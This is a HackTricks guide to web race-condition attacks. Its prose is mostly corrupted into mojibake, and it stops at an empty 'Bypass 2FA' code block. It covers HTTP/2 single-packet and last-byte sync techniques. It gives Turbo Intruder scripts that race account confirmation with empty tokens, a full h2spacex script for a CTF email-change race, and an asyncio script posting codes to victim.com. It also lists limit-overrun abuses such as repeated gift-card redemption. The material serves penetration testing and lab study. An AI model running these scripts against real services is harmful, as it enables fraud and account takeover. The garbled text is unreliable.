# Race Condition

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµ**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

{% hint style="warning" %}
è¦æ·±å…¥äº†è§£æ­¤æŠ€æœ¯ï¼Œè¯·æŸ¥çœ‹åŸå§‹æŠ¥å‘Š [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## å¢å¼ºç«äº‰æ¡ä»¶æ”»å‡»

åˆ©ç”¨ç«äº‰æ¡ä»¶çš„ä¸»è¦éšœç¢æ˜¯ç¡®ä¿å¤šä¸ªè¯·æ±‚åŒæ—¶å¤„ç†ï¼Œ**å¤„ç†æ—¶é—´å·®å¼‚éå¸¸å°â€”â€”ç†æƒ³æƒ…å†µä¸‹ï¼Œå°‘äº 1 æ¯«ç§’**ã€‚

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€äº›åŒæ­¥è¯·æ±‚çš„æŠ€æœ¯ï¼š

#### HTTP/2 å•åŒ…æ”»å‡»ä¸ HTTP/1.1 æœ€åå­—èŠ‚åŒæ­¥

* **HTTP/2**ï¼šæ”¯æŒé€šè¿‡å•ä¸ª TCP è¿æ¥å‘é€ä¸¤ä¸ªè¯·æ±‚ï¼Œå‡å°‘ç½‘ç»œæŠ–åŠ¨çš„å½±å“ã€‚ç„¶è€Œï¼Œç”±äºæœåŠ¡å™¨ç«¯çš„å˜åŒ–ï¼Œä¸¤ä¸ªè¯·æ±‚å¯èƒ½ä¸è¶³ä»¥å®ç°ä¸€è‡´çš„ç«äº‰æ¡ä»¶åˆ©ç”¨ã€‚
* **HTTP/1.1 'æœ€åå­—èŠ‚åŒæ­¥'**ï¼šå…è®¸é¢„å‘é€ 20-30 ä¸ªè¯·æ±‚çš„å¤§éƒ¨åˆ†å†…å®¹ï¼Œä¿ç•™ä¸€ä¸ªå°ç‰‡æ®µï¼Œç„¶åä¸€èµ·å‘é€ï¼Œå®ç°åŒæ—¶åˆ°è¾¾æœåŠ¡å™¨ã€‚

**æœ€åå­—èŠ‚åŒæ­¥çš„å‡†å¤‡**åŒ…æ‹¬ï¼š

1. å‘é€å¤´éƒ¨å’Œä¸»ä½“æ•°æ®ï¼Œå»æ‰æœ€åä¸€ä¸ªå­—èŠ‚è€Œä¸ç»“æŸæµã€‚
2. åœ¨åˆå§‹å‘é€åæš‚åœ 100 æ¯«ç§’ã€‚
3. ç¦ç”¨ TCP\_NODELAYï¼Œä»¥åˆ©ç”¨ Nagle ç®—æ³•æ‰¹å¤„ç†æœ€åçš„å¸§ã€‚
4. å‘é€ ping ä»¥é¢„çƒ­è¿æ¥ã€‚

éšåå‘é€çš„ä¿ç•™å¸§åº”ä»¥å•ä¸ªæ•°æ®åŒ…åˆ°è¾¾ï¼Œå¯ä»¥é€šè¿‡ Wireshark éªŒè¯ã€‚æ­¤æ–¹æ³•ä¸é€‚ç”¨äºé™æ€æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶é€šå¸¸ä¸æ¶‰åŠ RC æ”»å‡»ã€‚

### é€‚åº”æœåŠ¡å™¨æ¶æ„

äº†è§£ç›®æ ‡çš„æ¶æ„è‡³å…³é‡è¦ã€‚å‰ç«¯æœåŠ¡å™¨å¯èƒ½ä»¥ä¸åŒçš„æ–¹å¼è·¯ç”±è¯·æ±‚ï¼Œä»è€Œå½±å“æ—¶åºã€‚é€šè¿‡æ— å…³è¯·æ±‚è¿›è¡Œé¢„çƒ­çš„æœåŠ¡å™¨ç«¯è¿æ¥ï¼Œå¯èƒ½ä¼šä½¿è¯·æ±‚æ—¶åºæ­£å¸¸åŒ–ã€‚

#### å¤„ç†åŸºäºä¼šè¯çš„é”å®š

åƒ PHP çš„ä¼šè¯å¤„ç†ç¨‹åºè¿™æ ·çš„æ¡†æ¶æŒ‰ä¼šè¯åºåˆ—åŒ–è¯·æ±‚ï¼Œå¯èƒ½ä¼šæ©ç›–æ¼æ´ã€‚ä¸ºæ¯ä¸ªè¯·æ±‚ä½¿ç”¨ä¸åŒçš„ä¼šè¯ä»¤ç‰Œå¯ä»¥è§„é¿æ­¤é—®é¢˜ã€‚

#### å…‹æœé€Ÿç‡æˆ–èµ„æºé™åˆ¶

å¦‚æœè¿æ¥é¢„çƒ­æ— æ•ˆï¼Œé€šè¿‡å¤§é‡è™šå‡è¯·æ±‚æ•…æ„è§¦å‘ Web æœåŠ¡å™¨çš„é€Ÿç‡æˆ–èµ„æºé™åˆ¶å»¶è¿Ÿï¼Œå¯èƒ½ä¼šé€šè¿‡å¼•å‘æœåŠ¡å™¨ç«¯å»¶è¿Ÿæ¥ä¿ƒè¿›å•åŒ…æ”»å‡»ï¼Œä»è€Œæœ‰åˆ©äºç«äº‰æ¡ä»¶ã€‚

## æ”»å‡»ç¤ºä¾‹

* **Tubo Intruder - HTTP2 å•åŒ…æ”»å‡» (1 ä¸ªç«¯ç‚¹)**ï¼šæ‚¨å¯ä»¥å°†è¯·æ±‚å‘é€åˆ° **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`)ï¼Œæ‚¨å¯ä»¥åœ¨è¯·æ±‚ä¸­æ›´æ”¹è¦æš´åŠ›ç ´è§£çš„ **`%s`** çš„å€¼ï¼Œä¾‹å¦‚ `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`ï¼Œç„¶åä»ä¸‹æ‹‰èœå•ä¸­é€‰æ‹© **`examples/race-single-packer-attack.py`**ï¼š

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

å¦‚æœæ‚¨è¦ **å‘é€ä¸åŒçš„å€¼**ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªä¿®æ”¹è¿‡çš„ä»£ç ï¼Œå®ƒä½¿ç”¨å‰ªè´´æ¿ä¸­çš„å­—å…¸ï¼š
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
å¦‚æœç½‘ç«™ä¸æ”¯æŒ HTTP2ï¼ˆä»…æ”¯æŒ HTTP1.1ï¼‰ï¼Œè¯·ä½¿ç”¨ `Engine.THREADED` æˆ– `Engine.BURP`ï¼Œè€Œä¸æ˜¯ `Engine.BURP2`ã€‚
{% endhint %}

* **Tubo Intruder - HTTP2 å•åŒ…æ”»å‡»ï¼ˆå¤šä¸ªç«¯ç‚¹ï¼‰**: å¦‚æœæ‚¨éœ€è¦å‘ä¸€ä¸ªç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œç„¶åå‘å…¶ä»–å¤šä¸ªç«¯ç‚¹å‘é€è¯·æ±‚ä»¥è§¦å‘ RCEï¼Œæ‚¨å¯ä»¥å°† `race-single-packet-attack.py` è„šæœ¬æ›´æ”¹ä¸ºå¦‚ä¸‹å†…å®¹ï¼š
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* å®ƒä¹Ÿå¯ä»¥é€šè¿‡ Burp Suite ä¸­æ–°çš„â€œ**å¹¶è¡Œå‘é€ç»„**â€é€‰é¡¹åœ¨ **Repeater** ä¸­ä½¿ç”¨ã€‚
* å¯¹äº **limit-overrun**ï¼Œæ‚¨å¯ä»¥åœ¨ç»„ä¸­**æ·»åŠ ç›¸åŒçš„è¯·æ±‚ 50 æ¬¡**ã€‚
* å¯¹äº **connection warming**ï¼Œæ‚¨å¯ä»¥åœ¨ **ç»„çš„å¼€å§‹**æ·»åŠ ä¸€äº›è¯·æ±‚åˆ° web æœåŠ¡å™¨çš„æŸä¸ªéé™æ€éƒ¨åˆ†ã€‚
* å¯¹äºåœ¨å¤„ç† **ä¸€ä¸ªè¯·æ±‚å’Œå¦ä¸€ä¸ªè¯·æ±‚ä¹‹é—´**çš„è¿‡ç¨‹ **å»¶è¿Ÿ**ï¼Œæ‚¨å¯ä»¥åœ¨ä¸¤ä¸ªè¯·æ±‚ä¹‹é—´ **æ·»åŠ é¢å¤–çš„è¯·æ±‚**ã€‚
* å¯¹äº **multi-endpoint** RCï¼Œæ‚¨å¯ä»¥å¼€å§‹å‘é€ **è¯·æ±‚**ï¼Œè¯¥è¯·æ±‚ **è¿›å…¥éšè—çŠ¶æ€**ï¼Œç„¶ååœ¨å…¶å **å‘é€ 50 ä¸ªè¯·æ±‚**ï¼Œè¿™äº›è¯·æ±‚ **åˆ©ç”¨éšè—çŠ¶æ€**ã€‚

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **è‡ªåŠ¨åŒ– python è„šæœ¬**ï¼šè¯¥è„šæœ¬çš„ç›®æ ‡æ˜¯åœ¨ä¸æ–­éªŒè¯çš„åŒæ—¶æ›´æ”¹ç”¨æˆ·çš„ç”µå­é‚®ä»¶ï¼Œç›´åˆ°æ–°ç”µå­é‚®ä»¶çš„éªŒè¯ä»¤ç‰Œåˆ°è¾¾æœ€åä¸€ä¸ªç”µå­é‚®ä»¶ï¼ˆè¿™æ˜¯å› ä¸ºåœ¨ä»£ç ä¸­çœ‹åˆ°ä¸€ä¸ª RCï¼Œå¯ä»¥ä¿®æ”¹ç”µå­é‚®ä»¶ï¼Œä½†éªŒè¯è¢«å‘é€åˆ°æ—§ç”µå­é‚®ä»¶ï¼Œå› ä¸ºæŒ‡ç¤ºç”µå­é‚®ä»¶çš„å˜é‡å·²ç»ç”¨ç¬¬ä¸€ä¸ªå¡«å……ï¼‰ã€‚\
å½“åœ¨æ”¶åˆ°çš„ç”µå­é‚®ä»¶ä¸­æ‰¾åˆ°â€œobjetivoâ€è¿™ä¸ªè¯æ—¶ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬æ”¶åˆ°äº†æ›´æ”¹ç”µå­é‚®ä»¶çš„éªŒè¯ä»¤ç‰Œï¼Œå¹¶ç»“æŸæ”»å‡»ã€‚
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### æ”¹è¿›å•åŒ…æ”»å‡»

åœ¨åŸå§‹ç ”ç©¶ä¸­è§£é‡Šäº†æ­¤æ”»å‡»çš„é™åˆ¶ä¸º1,500å­—èŠ‚ã€‚ç„¶è€Œï¼Œåœ¨[**è¿™ç¯‡æ–‡ç« **](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)ä¸­ï¼Œè§£é‡Šäº†å¦‚ä½•é€šè¿‡ä½¿ç”¨IPå±‚åˆ†ç‰‡ï¼ˆå°†å•ä¸ªæ•°æ®åŒ…æ‹†åˆ†ä¸ºå¤šä¸ªIPæ•°æ®åŒ…ï¼‰å¹¶ä»¥ä¸åŒé¡ºåºå‘é€å®ƒä»¬ï¼Œä»è€Œæ‰©å±•å•åŒ…æ”»å‡»çš„1,500å­—èŠ‚é™åˆ¶åˆ°**TCPçš„65,535 Bçª—å£é™åˆ¶**ï¼Œè¿™ä½¿å¾—åœ¨æ‰€æœ‰ç‰‡æ®µåˆ°è¾¾æœåŠ¡å™¨ä¹‹å‰ï¼Œé˜²æ­¢é‡æ–°ç»„è£…æ•°æ®åŒ…ã€‚è¿™é¡¹æŠ€æœ¯ä½¿ç ”ç©¶äººå‘˜èƒ½å¤Ÿåœ¨å¤§çº¦166æ¯«ç§’å†…å‘é€10,000ä¸ªè¯·æ±‚ã€‚&#x20;

è¯·æ³¨æ„ï¼Œå°½ç®¡æ­¤æ”¹è¿›ä½¿å¾—åœ¨éœ€è¦æ•°ç™¾/æ•°åƒä¸ªæ•°æ®åŒ…åŒæ—¶åˆ°è¾¾çš„RCæ”»å‡»ä¸­æ›´å¯é ï¼Œä½†å®ƒä¹Ÿå¯èƒ½æœ‰ä¸€äº›è½¯ä»¶é™åˆ¶ã€‚ä¸€äº›æµè¡Œçš„HTTPæœåŠ¡å™¨å¦‚Apacheã€Nginxå’ŒGoå°†`SETTINGS_MAX_CONCURRENT_STREAMS`è®¾ç½®ä¸º100ã€128å’Œ250ã€‚ç„¶è€Œï¼Œå…¶ä»–å¦‚NodeJSå’Œnghttp2åˆ™æ²¡æœ‰é™åˆ¶ã€‚\
è¿™åŸºæœ¬ä¸Šæ„å‘³ç€Apacheå°†åªè€ƒè™‘æ¥è‡ªå•ä¸ªTCPè¿æ¥çš„100ä¸ªHTTPè¿æ¥ï¼ˆé™åˆ¶äº†æ­¤RCæ”»å‡»ï¼‰ã€‚

æ‚¨å¯ä»¥åœ¨ä»“åº“[https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main)ä¸­æ‰¾åˆ°ä½¿ç”¨æ­¤æŠ€æœ¯çš„ä¸€äº›ç¤ºä¾‹ã€‚

## åŸå§‹BF

åœ¨ä¹‹å‰çš„ç ”ç©¶ä¹‹å‰ï¼Œè¿™é‡Œæœ‰ä¸€äº›ç”¨äºå°è¯•å°½å¯èƒ½å¿«åœ°å‘é€æ•°æ®åŒ…ä»¥å¼•å‘RCçš„æœ‰æ•ˆè½½è·ã€‚

* **Repeater:** æŸ¥çœ‹ä¸Šä¸€èŠ‚ä¸­çš„ç¤ºä¾‹ã€‚
* **Intruder**: å°†**è¯·æ±‚**å‘é€åˆ°**Intruder**ï¼Œåœ¨**é€‰é¡¹èœå•**ä¸­å°†**çº¿ç¨‹æ•°**è®¾ç½®ä¸º**30**ï¼Œå¹¶é€‰æ‹©æœ‰æ•ˆè½½è·**ç©ºæœ‰æ•ˆè½½è·**å¹¶ç”Ÿæˆ**30**ä¸ªã€‚
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

è¿™æ˜¯æœ€åŸºæœ¬çš„ç«äº‰æ¡ä»¶ç±»å‹ï¼Œå…¶ä¸­**æ¼æ´**å‡ºç°åœ¨**é™åˆ¶ä½ æ‰§è¡ŒæŸä¸ªæ“ä½œæ¬¡æ•°**çš„åœ°æ–¹ã€‚æ¯”å¦‚åœ¨ç½‘ä¸Šå•†åº—ä¸­å¤šæ¬¡ä½¿ç”¨ç›¸åŒçš„æŠ˜æ‰£ç ã€‚ä¸€ä¸ªéå¸¸ç®€å•çš„ä¾‹å­å¯ä»¥åœ¨[**è¿™ä»½æŠ¥å‘Š**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43)æˆ–[**è¿™ä¸ªæ¼æ´**](https://hackerone.com/reports/759247)**ä¸­æ‰¾åˆ°ã€‚**

è¿™ç§æ”»å‡»æœ‰è®¸å¤šå˜ä½“ï¼ŒåŒ…æ‹¬ï¼š

* å¤šæ¬¡å…‘æ¢ç¤¼å“å¡
* å¤šæ¬¡è¯„ä»·äº§å“
* æå–æˆ–è½¬ç§»è¶…è¿‡è´¦æˆ·ä½™é¢çš„ç°é‡‘
* é‡å¤ä½¿ç”¨å•ä¸ª CAPTCHA è§£
* ç»•è¿‡åæš´åŠ›ç ´è§£é€Ÿç‡é™åˆ¶

### **Hidden substates**

åˆ©ç”¨å¤æ‚çš„ç«äº‰æ¡ä»¶é€šå¸¸æ¶‰åŠåˆ©ç”¨ä¸éšè—æˆ–**æ„å¤–æœºå™¨å­çŠ¶æ€**äº¤äº’çš„çŸ­æš‚æœºä¼šã€‚ä»¥ä¸‹æ˜¯å¤„ç†æ­¤é—®é¢˜çš„æ–¹æ³•ï¼š

1. **è¯†åˆ«æ½œåœ¨çš„éšè—å­çŠ¶æ€**
* é¦–å…ˆç¡®å®šä¿®æ”¹æˆ–ä¸å…³é”®æ•°æ®äº¤äº’çš„ç«¯ç‚¹ï¼Œä¾‹å¦‚ç”¨æˆ·èµ„æ–™æˆ–å¯†ç é‡ç½®è¿‡ç¨‹ã€‚é‡ç‚¹å…³æ³¨ï¼š
* **å­˜å‚¨**ï¼šä¼˜å…ˆé€‰æ‹©æ“ä½œæœåŠ¡å™¨ç«¯æŒä¹…æ•°æ®çš„ç«¯ç‚¹ï¼Œè€Œä¸æ˜¯å¤„ç†å®¢æˆ·ç«¯æ•°æ®çš„ç«¯ç‚¹ã€‚
* **æ“ä½œ**ï¼šå¯»æ‰¾æ›´å¯èƒ½åˆ›å»ºå¯åˆ©ç”¨æ¡ä»¶çš„æ“ä½œï¼Œè¿™äº›æ“ä½œä¼šæ›´æ”¹ç°æœ‰æ•°æ®ï¼Œè€Œä¸æ˜¯æ·»åŠ æ–°æ•°æ®ã€‚
* **é”®æ§**ï¼šæˆåŠŸçš„æ”»å‡»é€šå¸¸æ¶‰åŠåŸºäºç›¸åŒæ ‡è¯†ç¬¦çš„æ“ä½œï¼Œä¾‹å¦‚ç”¨æˆ·åæˆ–é‡ç½®ä»¤ç‰Œã€‚
2. **è¿›è¡Œåˆæ­¥æ¢æµ‹**
* ä½¿ç”¨ç«äº‰æ¡ä»¶æ”»å‡»æµ‹è¯•è¯†åˆ«çš„ç«¯ç‚¹ï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰ä»»ä½•åç¦»é¢„æœŸç»“æœçš„æƒ…å†µã€‚æ„å¤–çš„å“åº”æˆ–åº”ç”¨ç¨‹åºè¡Œä¸ºçš„å˜åŒ–å¯èƒ½è¡¨æ˜å­˜åœ¨æ¼æ´ã€‚
3. **è¯æ˜æ¼æ´**
* å°†æ”»å‡»ç¼©å°åˆ°åˆ©ç”¨æ¼æ´æ‰€éœ€çš„æœ€å°‘è¯·æ±‚æ•°é‡ï¼Œé€šå¸¸ä»…ä¸ºä¸¤ä¸ªã€‚æ­¤æ­¥éª¤å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•æˆ–è‡ªåŠ¨åŒ–ï¼Œå› ä¸ºæ¶‰åŠç²¾ç¡®çš„æ—¶æœºã€‚

### æ—¶é—´æ•æ„Ÿæ”»å‡»

è¯·æ±‚çš„æ—¶æœºç²¾ç¡®æ€§å¯ä»¥æ­ç¤ºæ¼æ´ï¼Œç‰¹åˆ«æ˜¯å½“ä½¿ç”¨å¯é¢„æµ‹çš„æ–¹æ³•ï¼ˆå¦‚æ—¶é—´æˆ³ï¼‰ä½œä¸ºå®‰å…¨ä»¤ç‰Œæ—¶ã€‚ä¾‹å¦‚ï¼ŒåŸºäºæ—¶é—´æˆ³ç”Ÿæˆå¯†ç é‡ç½®ä»¤ç‰Œå¯èƒ½å…è®¸åŒæ—¶è¯·æ±‚ç›¸åŒçš„ä»¤ç‰Œã€‚

**åˆ©ç”¨æ–¹æ³•ï¼š**

* ä½¿ç”¨ç²¾ç¡®çš„æ—¶æœºï¼Œä¾‹å¦‚å•ä¸ªæ•°æ®åŒ…æ”»å‡»ï¼Œå‘èµ·å¹¶å‘çš„å¯†ç é‡ç½®è¯·æ±‚ã€‚ç›¸åŒçš„ä»¤ç‰Œè¡¨æ˜å­˜åœ¨æ¼æ´ã€‚

**ç¤ºä¾‹ï¼š**

* åŒæ—¶è¯·æ±‚ä¸¤ä¸ªå¯†ç é‡ç½®ä»¤ç‰Œå¹¶è¿›è¡Œæ¯”è¾ƒã€‚åŒ¹é…çš„ä»¤ç‰Œè¡¨æ˜ä»¤ç‰Œç”Ÿæˆå­˜åœ¨ç¼ºé™·ã€‚

**æŸ¥çœ‹è¿™ä¸ª** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **æ¥å°è¯•è¿™ä¸ªã€‚**

## Hidden substates case studies

### Pay & add an Item

æŸ¥çœ‹è¿™ä¸ª [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) ä»¥äº†è§£å¦‚ä½•åœ¨å•†åº—ä¸­**æ”¯ä»˜**å¹¶**æ·»åŠ ä¸€ä¸ªé¢å¤–**çš„ä½ **ä¸éœ€è¦æ”¯ä»˜çš„**ç‰©å“ã€‚

### Confirm other emails

è¿™ä¸ªæƒ³æ³•æ˜¯**åŒæ—¶éªŒè¯ä¸€ä¸ªç”µå­é‚®ä»¶åœ°å€å¹¶å°†å…¶æ›´æ”¹ä¸ºå¦ä¸€ä¸ª**ï¼Œä»¥æ‰¾å‡ºå¹³å°æ˜¯å¦éªŒè¯äº†æ›´æ”¹çš„æ–°åœ°å€ã€‚

### Change email to 2 emails addresses Cookie based

æ ¹æ®[**è¿™é¡¹ç ”ç©¶**](https://portswigger.net/research/smashing-the-state-machine)ï¼ŒGitlab é€šè¿‡è¿™ç§æ–¹å¼å®¹æ˜“å—åˆ°æ¥ç®¡ï¼Œå› ä¸ºå®ƒå¯èƒ½**å°†ä¸€ä¸ªç”µå­é‚®ä»¶çš„**ç”µå­é‚®ä»¶éªŒè¯ä»¤ç‰Œ**å‘é€åˆ°å¦ä¸€ä¸ªç”µå­é‚®ä»¶**ã€‚

**æŸ¥çœ‹è¿™ä¸ª** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **æ¥å°è¯•è¿™ä¸ªã€‚**

### Hidden Database states / Confirmation Bypass

å¦‚æœä½¿ç”¨**2ä¸ªä¸åŒçš„å†™å…¥**æ¥**æ·»åŠ **æ•°æ®åº“ä¸­çš„**ä¿¡æ¯**ï¼Œåˆ™åœ¨**æ•°æ®åº“ä¸­ä»…å†™å…¥ç¬¬ä¸€æ¡æ•°æ®**çš„çŸ­æš‚æ—¶é—´å†…ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå½“åˆ›å»ºç”¨æˆ·æ—¶ï¼Œ**ç”¨æˆ·å**å’Œ**å¯†ç **å¯èƒ½ä¼šè¢«**å†™å…¥**ï¼Œç„¶å**ä»¤ç‰Œ**ç”¨äºç¡®è®¤æ–°åˆ›å»ºçš„è´¦æˆ·è¢«å†™å…¥ã€‚è¿™æ„å‘³ç€åœ¨çŸ­æ—¶é—´å†…ï¼Œ**ç¡®è®¤è´¦æˆ·çš„ä»¤ç‰Œæ˜¯ç©ºçš„**ã€‚

å› æ­¤ï¼Œ**æ³¨å†Œä¸€ä¸ªè´¦æˆ·å¹¶å‘é€å¤šä¸ªå¸¦æœ‰ç©ºä»¤ç‰Œçš„è¯·æ±‚**ï¼ˆ`token=`æˆ–`token[]=`æˆ–ä»»ä½•å…¶ä»–å˜ä½“ï¼‰ä»¥ç«‹å³ç¡®è®¤è´¦æˆ·ï¼Œå¯èƒ½å…è®¸ç¡®è®¤ä¸€ä¸ªä½ ä¸æ§åˆ¶ç”µå­é‚®ä»¶çš„**è´¦æˆ·**ã€‚

**æŸ¥çœ‹è¿™ä¸ª** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **æ¥å°è¯•è¿™ä¸ªã€‚**

### Bypass 2FA

ä»¥ä¸‹ä¼ªä»£ç å®¹æ˜“å—åˆ°ç«äº‰æ¡ä»¶çš„å½±å“ï¼Œå› ä¸ºåœ¨åˆ›å»ºä¼šè¯çš„éå¸¸çŸ­æ—¶é—´å†…ï¼Œ**2FAæœªè¢«å¼ºåˆ¶æ‰§è¡Œ**ï¼š
```python
